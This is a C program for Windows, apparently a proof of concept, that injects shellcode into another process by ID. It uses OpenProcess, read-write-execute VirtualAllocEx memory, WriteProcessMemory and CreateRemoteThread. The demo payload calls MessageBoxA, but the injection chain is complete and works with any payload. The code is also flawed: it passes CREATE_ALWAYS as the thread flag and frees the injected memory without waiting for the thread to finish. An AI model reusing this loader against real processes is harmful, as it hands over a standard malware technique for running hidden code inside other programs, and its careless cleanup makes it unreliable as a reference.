#include <stdio.h>
#include <Windows.h>

void* memmem(const void* haystack, size_t haystack_len, const void* needle, size_t needle_len)
{
	if (haystack == NULL) return NULL;
	if (haystack_len == 0) return NULL;
	if (needle == NULL) return NULL;
	if (needle_len == 0) return NULL;

	for (const char* h = (char*)haystack; haystack_len >= needle_len; h++, haystack_len--) {
		if (!memcmp(h, needle, needle_len)) {
			return (void*)h;
		}
	}
	return NULL;
}

#define PROCESS_ID 21904


int main(){

	int processId = PROCESS_ID;
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);


	BYTE payload[] = {
		/*0: */			0x48, 0xB8, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,	// movabs  rax, 0x1111111111111111
		/*a: */			0x49, 0x89, 0xc0, 						// mov r8, rax
		/*d: */			0x48, 0xB8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,	// movabs  rax, 0x2222222222222222
		/*17: */		0x48, 0x89, 0xc2, 						// mov rdx, rax
		/*1a: */		0x48, 0x31, 0xC9,						// xor rcx, rcx
		/*1d: */		0x4D, 0x31, 0xC9,						// xor r9, r9
		/*20: */		0x48, 0x83, 0xEC, 0x28,						// sub rsp, 0x28
		/*24: */		0x48, 0xB8, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33,	// movabs  rax, 0x3333333333333333
		/*2e: */		0xFF, 0xD0,							// call rax
		/*30: */		0x48, 0x83, 0xC4, 0x28,						// add rsp, 0x28
		/*34: */		0x48, 0x31, 0xc0,						// xor rax, rax
		/*37: */		0xC3,								// ret
		/*38: */		'H', '3', 'l', 'L', '0', 0x00,
		/*3e: */		'W', '0', 'r', 'l', 'D', 0x00 };							

	HMODULE hntdll = LoadLibraryA("user32");
	PVOID hMessageBoxA = (PVOID)GetProcAddress(hntdll, "MessageBoxA");
	
	
	
	LPVOID address = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	DWORD64 bytes = 0;

	*((DWORD64*)(memmem(payload, sizeof(payload), "\x11\x11\x11\x11\x11\x11\x11\x11", 8))) = (DWORD64)address + 0x38;
	*((DWORD64*)(memmem(payload, sizeof(payload), "\x22\x22\x22\x22\x22\x22\x22\x22", 8))) = (DWORD64)address + 0x3e;
	memcpy(memmem(payload, sizeof(payload), "\x33\x33\x33\x33\x33\x33\x33\x33", 8), &hMessageBoxA, 8);

	WriteProcessMemory(hProcess, address, payload, sizeof(payload), &bytes);
	CreateRemoteThread(hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)address,
		NULL,
		CREATE_ALWAYS, NULL);
	
	char buffer[0x1000];
	memset(buffer, 0x00, 4096);
	WriteProcessMemory(hProcess, address, buffer, sizeof(buffer), &bytes);
	VirtualFreeEx(hProcess, address, 4096, MEM_DECOMMIT | MEM_RELEASE);
	CloseHandle(hProcess);
	return 0;
}
